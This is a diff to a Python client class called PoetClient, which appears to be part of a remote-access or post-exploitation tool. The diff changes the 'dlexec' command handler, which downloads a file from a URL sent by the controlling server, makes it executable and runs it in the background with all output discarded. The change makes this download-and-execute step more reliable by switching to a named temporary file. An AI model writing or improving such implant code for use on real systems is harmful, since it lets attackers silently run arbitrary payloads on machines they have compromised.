@@ -7,13 +7,13 @@ import stat
 import time
 import zlib
 import base64
-import random
 import select
 import socket
 import struct
 import os.path
 import urllib2
 import argparse
+import tempfile
 import logging as log
 import subprocess as sp
 from datetime import datetime
@@ -187,16 +187,22 @@ class PoetClient(object):
     def dlexec(self, inp):
         """Handle server `dlexec' command.
 
-        Download file from internet, save to /tmp and execute.
+        Download file from internet, save to temp file, execute.
         """
 
         r = urllib2.urlopen(inp.split()[1])
-        rand = str(random.random())[2:6]
-        tmp = '/tmp/tmux-{}'.format(rand)
-        with open(tmp, 'w') as f:
+
+        # don't delete the file automatically because otherwise something weird
+        # happens and we might (will) delete the file before it gets loaded
+        # into memory? if we didn't include this, we would need to call wait()
+        # or sp.call() instead later on
+        with tempfile.NamedTemporaryFile(delete=False) as f:
             f.write(r.read())
             os.fchmod(f.fileno(), stat.S_IRWXU)
-        sp.Popen(tmp, stdout=open(os.devnull, 'w'), stderr=sp.STDOUT)
+            f.flush()  # ensure that file was actually written to disk
+            # intentionally not using sp.call() here because we don't
+            # necessarily want to wait() on the process
+            sp.Popen(f.name, stdout=open(os.devnull, 'w'), stderr=sp.STDOUT)
 
     def chint(self, s, inp):
         """Handle server `chint' command.
